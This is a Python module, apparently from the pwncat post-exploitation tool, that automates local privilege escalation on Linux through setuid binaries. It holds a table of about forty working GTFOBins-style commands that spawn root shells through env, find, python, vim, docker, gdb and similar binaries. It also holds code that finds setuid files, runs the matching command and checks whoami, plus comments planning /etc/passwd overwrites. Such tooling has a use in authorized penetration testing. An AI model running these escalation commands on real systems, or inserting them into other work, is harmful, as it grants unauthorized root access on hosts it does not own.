#!/usr/bin/env python3
from typing import Generator, List
import shlex
import sys
from time import sleep
import os
from colorama import Fore, Style

from pwncat.util import info, success, error, progress, warn
from pwncat.privesc.base import Method, PrivescError, Technique

# https://gtfobins.github.io/#+suid
known_setuid_privescs = {
    "env": ("{} /bin/bash -p", "exit"),
    "bash": ("{} -p", "exit"),
    "chmod": ("{} +s /bin/bash\n/bin/bash -p", "exit"),
    "chroot": ("{} / /bin/bash -p", "exit"),
    "dash": ("{} -p", "exit"),
    "ash": ("{}", "exit"),
    "docker": ("{} run -v /:/mnt --rm -it alpine chroot /mnt sh", "exit"),
    "emacs": ("""{} -Q -nw --eval '(term "/bin/sh -p")'""", "exit"),
    "find": ("{} . -exec /bin/sh -p \\; -quit", "exit"),
    "flock": ("{} -u / /bin/sh -p", "exit"),
    "gdb": (
        """{} -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit""",
        "exit",
    ),
    "logsave": ("{} /dev/null /bin/bash -i -p", "exit"),
    "make": (
        "COMMAND='/bin/sh -p'",
        """{} -s --eval=$'x:\\n\\t-'\"$COMMAND\"""",
        "exit",
    ),
    "nice": ("{} /bin/bash -p", "exit"),
    "node": (
        """{} -e 'require("child_process").spawn("/bin/sh", ("-p"), {stdio: (0, 1, 2)});'""",
        "exit",
    ),
    "nohup": ("""{} /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\"""", "exit"),
    "perl": ("""{} -e 'exec "/bin/sh";'""", "exit"),
    "php": ("""{} -r \"pcntl_exec('/bin/sh', ('-p'));\"""", "exit"),
    "python": ("""{} -c 'import os; os.execl("/bin/sh", "sh", "-p")'""", "exit"),
    "rlwrap": ("{} -H /dev/null /bin/sh -p", "exit"),
    "rpm": ("""{} --eval '%{lua:os.execute("/bin/sh", "-p")}'""", "exit"),
    "rpmquery": ("""{} --eval '%{lua:posix.exec("/bin/sh", "-p")}'""", "exit"),
    "rsync": ("""{} -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null""", "exit"),
    "run-parts": ("""{} --new-session --regex '^sh$' /bin --arg='-p'""", "exit"),
    "rvim": (
        """{} -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'""",
        "exit",
    ),
    "setarch": ("""{} $(arch) /bin/sh -p""", "exit"),
    "start-stop-daemon": ("""{} -n $RANDOM -S -x /bin/sh -- -p""", "exit"),
    "strace": ("""{} -o /dev/null /bin/sh -p""", "exit"),
    "tclsh": ("""{}\nexec /bin/sh -p <@stdin >@stdout 2>@stderr; exit""", "exit"),
    "tclsh8.6": ("""{}\nexec /bin/sh -p <@stdin >@stdout 2>@stderr; exit""", "exit"),
    "taskset": ("""{} 1 /bin/sh -p""", "exit"),
    "time": ("""{} /bin/sh -p""", "exit"),
    "timeout": ("""{} 7d /bin/sh -p""", "exit"),
    "unshare": ("""{} -r /bin/sh""", "exit"),
    "vim": ("""{} -c ':!/bin/sh' -c ':q'""", "exit"),
    "watch": ("""{} -x sh -c 'reset; exec sh 1>&0 2>&0'""", "exit"),
    "zsh": ("""{}""", "exit"),
    # need to add in cp trick to overwrite /etc/passwd
    # need to add in curl trick to overwrite /etc/passwd
    # need to add in wget trick to overwrite /etc/passwd
    # need to add in dd trick to overwrite /etc/passwd
    # need to add in openssl trick to overwrite /etc/passwd
    # need to add in sed trick to overwrite /etc/passwd
    # need to add in shuf trick to overwrite /etc/passwd
    # need to add in systemctl trick to overwrite /etc/passwd
    # need to add in tee trick to overwrite /etc/passwd
    # need to add in wget trick to overwrite /etc/passwd
    # need to add in nano trick but requires Control+R Control+X keys
    # need to add in pico trick but requires Control+R Control+X keys
    # b"/bin/nano": ["/bin/nano", "\x12\x18reset; sh -p 1>&0 2>&0"],
}


class SetuidMethod(Method):

    name = "setuid"
    BINARIES = ["find", "stat"]

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        super(SetuidMethod, self).__init__(pty)

        self.suid_paths = None

    def find_suid(self):

        # Spawn a find command to locate the setuid binaries
        delim = self.pty.process("find / -perm -4000 -print 2>/dev/null")
        files = []
        self.suid_paths = {}

        while True:
            path = self.pty.recvuntil(b"\n").strip()
            progress("searching for setuid binaries")

            if delim in path:
                break

            files.append(path.decode("utf-8"))

        for path in files:
            user = (
                self.pty.run(f"stat -c '%U' {shlex.quote(path)}")
                .strip()
                .decode("utf-8")
            )
            if user not in self.suid_paths:
                self.suid_paths[user] = []
            self.suid_paths[user].append(path)

    def enumerate(self) -> List[Technique]:
        """ Find all techniques known at this time """

        if self.suid_paths is None:
            self.find_suid()

        for user, paths in self.suid_paths.items():
            for path in paths:
                for name, cmd in known_setuid_privescs.items():
                    if os.path.basename(path) == name:
                        yield Technique(user, self, (path, name, cmd))

    def execute(self, technique: Technique):
        """ Run the specified technique """

        path, name, commands = technique.ident

        info(
            f"attempting potential privesc with {Fore.GREEN}{Style.BRIGHT}{path}{Style.RESET_ALL}",
        )

        before_shell_level = self.pty.run("echo $SHLVL").strip()
        before_shell_level = int(before_shell_level) if before_shell_level != b"" else 0

        # for each_command in commands:
        #     self.pty.run(each_command.format(path), wait=False)

        # Run the start commands
        self.pty.run(commands[0].format(path) + "\n")

        # sleep(0.1)
        user = self.pty.run("whoami").strip().decode("utf-8")
        if user == technique.user:
            success("privesc succeeded")
            return commands[1]
        else:
            error(f"privesc failed (still {user} looking for {technique.user})")
            after_shell_level = self.pty.run("echo $SHLVL").strip()
            after_shell_level = (
                int(after_shell_level) if after_shell_level != b"" else 0
            )
            if after_shell_level > before_shell_level:
                info("exiting spawned inner shell")
                self.pty.run(commands[1], wait=False)  # here be dragons

        raise PrivescError(f"escalation failed for {technique}")
